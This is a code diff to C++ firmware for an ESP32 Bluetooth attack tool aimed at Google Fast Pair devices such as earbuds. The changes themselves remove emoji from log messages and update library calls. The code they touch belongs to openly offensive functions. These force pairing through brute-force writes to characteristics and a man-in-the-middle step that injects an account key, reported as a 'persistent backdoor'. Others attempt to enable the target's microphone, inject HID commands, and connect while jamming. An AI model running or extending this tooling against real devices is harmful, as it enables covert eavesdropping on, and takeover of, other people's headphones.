@@ -44,16 +44,16 @@ class PairingCaptureCallback : public NimBLEScanCallbacks {
                 uint16_t mfg_id = (mfg[1] << 8) | mfg[0];
                 
                 if(mfg_id == 0x00E0 || mfg_id == 0x2C00) {
-                    Serial.printf("\n📡 Found FastPair device: %s\n", 
+                    Serial.printf("\nFound FastPair device: %s\n", 
                                   advertisedDevice->getName().c_str());
                     
                     if(mfg.length() >= 4) {
                         uint8_t msg_type = mfg[2];
                         if(msg_type == 0x00) {
-                            Serial.println("📱 Phone detected!");
+                            Serial.println("Phone detected!");
                             g_capturedPhoneAddr = advertisedDevice->getAddress();
                         } else if(msg_type == 0x10 || msg_type == 0x20) {
-                            Serial.println("🎧 Target detected!");
+                            Serial.println("Target detected!");
                             g_capturedTargetAddr = advertisedDevice->getAddress();
                         }
                     }
@@ -82,15 +82,14 @@ void diagnoseConnection(NimBLEAddress target) {
     
     Serial.println("Attempting connection...");
     if(testClient->connect(target)) {
-        Serial.println("✓ Connection SUCCESS");
+        Serial.println("Connection SUCCESS");
         
-        const std::vector<NimBLERemoteService*>* services = testClient->getServices(true);
-        if(services) {
-            Serial.printf("✓ Found %d services\n", services->size());
-        }
+        const std::vector<NimBLERemoteService*> services = testClient->getServices(true);
+        Serial.printf("Found %d services\n", services.size());
+        
         testClient->disconnect();
     } else {
-        Serial.println("✗ Connection FAILED");
+        Serial.println("Connection FAILED");
         
         scanner->clearResults();
         scanner->setActiveScan(true);
@@ -100,14 +99,14 @@ void diagnoseConnection(NimBLEAddress target) {
         for(int i = 0; i < scanner->getResults().getCount(); i++) {
             const NimBLEAdvertisedDevice* dev = scanner->getResults().getDevice(i);
             if(dev->getAddress().equals(target)) {
-                Serial.printf("✓ Device IS advertising (RSSI: %d)\n", dev->getRSSI());
+                Serial.printf("Device IS advertising (RSSI: %d)\n", dev->getRSSI());
                 found = true;
                 break;
             }
         }
         
         if(!found) {
-            Serial.println("✗ Device NOT found in scan");
+            Serial.println("Device NOT found in scan");
         }
         
         scanner->stop();
@@ -128,13 +127,13 @@ bool connectWithRetry(NimBLEAddress target, int maxRetries, NimBLEClient** outCl
         bool connected = pClient->connect(target);
         
         if(connected && pClient->isConnected()) {
-            Serial.println("✓ Connection successful");
+            Serial.println("Connection successful");
             *outClient = pClient;
             delay(300);
             return true;
         }
         
-        Serial.printf("✗ Connection failed\n");
+        Serial.printf("Connection failed\n");
         NimBLEDevice::deleteClient(pClient);
         delay(1000);
     }
@@ -276,7 +275,6 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
         }
     }
     else {
-        // Simple fallback for 2+ buttons (if displayMessage doesn't exist)
         tft.fillScreen(bruceConfig.bgColor);
         drawMainBorderWithTitle("SELECT");
         tft.setTextColor(color, bruceConfig.bgColor);
@@ -469,7 +467,7 @@ bool requireSimpleConfirmation(const char* message) {
 NimBLEAddress parseAddress(const String& addressInfo) {
     int colonPos = addressInfo.lastIndexOf(':');
     if(colonPos == -1) {
-        return NimBLEAddress("");
+        return NimBLEAddress();
     }
     String mac = addressInfo.substring(0, colonPos);
     uint8_t type = addressInfo.substring(colonPos + 1).toInt();
@@ -568,16 +566,14 @@ bool whisperPairEfficientExploit(NimBLEAddress target) {
         }
     }
     
-    const std::vector<NimBLERemoteCharacteristic*>* charsPtr = pService->getCharacteristics(true);
-    if(charsPtr) {
-        for(auto pChar : *charsPtr) {
-            String uuid = pChar->getUUID().toString().c_str();
-            if(uuid.indexOf("1234") != -1 || uuid.indexOf("1236") != -1) continue;
-            if(pChar->canWriteNoResponse()) {
-                uint8_t test_data[2] = {0x00, 0x00};
-                if(pChar->writeValue(test_data, 2, false)) {
-                    showAdaptiveMessage("Can write to:", uuid.c_str(), "", "", TFT_YELLOW, false, true);
-                }
+    const std::vector<NimBLERemoteCharacteristic*> chars = pService->getCharacteristics(true);
+    for(auto pChar : chars) {
+        String uuid = pChar->getUUID().toString().c_str();
+        if(uuid.indexOf("1234") != -1 || uuid.indexOf("1236") != -1) continue;
+        if(pChar->canWriteNoResponse()) {
+            uint8_t test_data[2] = {0x00, 0x00};
+            if(pChar->writeValue(test_data, 2, false)) {
+                showAdaptiveMessage("Can write to:", uuid.c_str(), "", "", TFT_YELLOW, false, true);
             }
         }
     }
@@ -661,18 +657,16 @@ bool bruteForceCharacteristics(NimBLEAddress target) {
         return false;
     }
     
-    const std::vector<NimBLERemoteCharacteristic*>* charsPtr = pService->getCharacteristics(true);
+    const std::vector<NimBLERemoteCharacteristic*> chars = pService->getCharacteristics(true);
     bool found = false;
     
-    if(charsPtr) {
-        for(auto pChar : *charsPtr) {
-            if(pChar->canWrite()) {
-                uint8_t test_data[10];
-                esp_fill_random(test_data, 10);
-                if(pChar->writeValue(test_data, 10, false)) {
-                    found = true;
-                    delay(50);
-                }
+    for(auto pChar : chars) {
+        if(pChar->canWrite()) {
+            uint8_t test_data[10];
+            esp_fill_random(test_data, 10);
+            if(pChar->writeValue(test_data, 10, false)) {
+                found = true;
+                delay(50);
             }
         }
     }
@@ -859,14 +853,14 @@ bool captureLivePairing(const char* scanName) {
     
     NimBLEDevice::init(scanName);
     NimBLEScan* pScan = NimBLEDevice::getScan();
-    pScan->setCallbacks(&pairingCaptureCB);
+    pScan->setScanCallbacks(&pairingCaptureCB);
     pScan->setActiveScan(true);
     pScan->setInterval(50);
     pScan->setWindow(30);
     
     g_capturing = true;
-    g_capturedPhoneAddr = NimBLEAddress("");
-    g_capturedTargetAddr = NimBLEAddress("");
+    g_capturedPhoneAddr = NimBLEAddress();
+    g_capturedTargetAddr = NimBLEAddress();
     
     unsigned long startTime = millis();
     bool gotPhone = false;
@@ -888,7 +882,7 @@ bool captureLivePairing(const char* scanName) {
         }
         
         if(gotPhone && gotTarget) {
-            Serial.println("\n✅ Both devices detected!");
+            Serial.println("\nBoth devices detected!");
             break;
         }
         
@@ -1006,7 +1000,7 @@ bool performMITMAttack(NimBLEAddress target, CapturedKeys& keys) {
             delay(100);
             std::string ack = pAccountChar->readValue();
             if(ack.length() > 0) {
-                Serial.println("✅ ACCOUNT KEY INJECTED!");
+                Serial.println("ACCOUNT KEY INJECTED!");
                 memcpy(keys.account_key, account_key, 16);
                 keys.keys_captured = true;
                 showSuccessMessage("PERSISTENT BACKDOOR INSTALLED!");
@@ -1018,7 +1012,7 @@ bool performMITMAttack(NimBLEAddress target, CapturedKeys& keys) {
     NimBLEDevice::deleteClient(pTargetClient);
     
     if(keys.keys_captured) {
-        Serial.println("\n🎯 MITM SUCCESSFUL!");
+        Serial.println("\nMITM SUCCESSFUL!");
         return true;
     }
     
@@ -1041,7 +1035,7 @@ bool activateMicrophoneHijack(NimBLEAddress target) {
         if(pAudioChar && pAudioChar->canWrite()) {
             uint8_t enable_mic[] = {0x01, 0x00};
             if(pAudioChar->writeValue(enable_mic, 2, true)) {
-                Serial.println("⚠️  Microphone access attempted");
+                Serial.println("Microphone access attempted");
                 showWarningMessage("MIC ACCESS ATTEMPTED");
             }
         }
@@ -1070,22 +1064,20 @@ bool simulateHIDKeyboard(NimBLEAddress target) {
     if(pHidService) {
         Serial.println("HID service found!");
         
-        const std::vector<NimBLERemoteCharacteristic*>* chars = pHidService->getCharacteristics(true);
-        if(chars) {
-            for(auto pChar : *chars) {
-                String uuid = pChar->getUUID().toString().c_str();
+        const std::vector<NimBLERemoteCharacteristic*> chars = pHidService->getCharacteristics(true);
+        for(auto pChar : chars) {
+            String uuid = pChar->getUUID().toString().c_str();
+            
+            if(uuid.indexOf("2A4D") != -1 || 
+               uuid.indexOf("2A4E") != -1 || 
+               uuid.indexOf("2A4F") != -1) {
                 
-                if(uuid.indexOf("2A4D") != -1 || 
-                   uuid.indexOf("2A4E") != -1 || 
-                   uuid.indexOf("2A4F") != -1) {
+                if(pChar->canWrite()) {
+                    uint8_t media_play[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                     
-                    if(pChar->canWrite()) {
-                        uint8_t media_play[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-                        
-                        if(pChar->writeValue(media_play, 8, false)) {
-                            Serial.println("⚠️  HID command sent");
-                            showWarningMessage("HID COMMAND INJECTED");
-                        }
+                    if(pChar->writeValue(media_play, 8, false)) {
+                        Serial.println("HID command sent");
+                        showWarningMessage("HID COMMAND INJECTED");
                     }
                 }
             }
@@ -1123,11 +1115,11 @@ bool checkBackdoorAccess(NimBLEAddress target) {
     
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(pService) {
-        Serial.println("✅ FastPair service accessible");
+        Serial.println("FastPair service accessible");
         
         NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
         if(pChar && pChar->canWrite()) {
-            Serial.println("✅ Can write to KBP characteristic!");
+            Serial.println("Can write to KBP characteristic!");
             showSuccessMessage("BACKDOOR ACTIVE!");
             pClient->disconnect();
             NimBLEDevice::deleteClient(pClient);
@@ -1165,7 +1157,7 @@ bool jamAndConnectEnhanced(NimBLEAddress target) {
         if(connectWithRetry(target, 1, &tempClient)) {
             connected = true;
             pClient = tempClient;
-            Serial.println("✅ Connected while jamming!");
+            Serial.println("Connected while jamming!");
             break;
         }
         
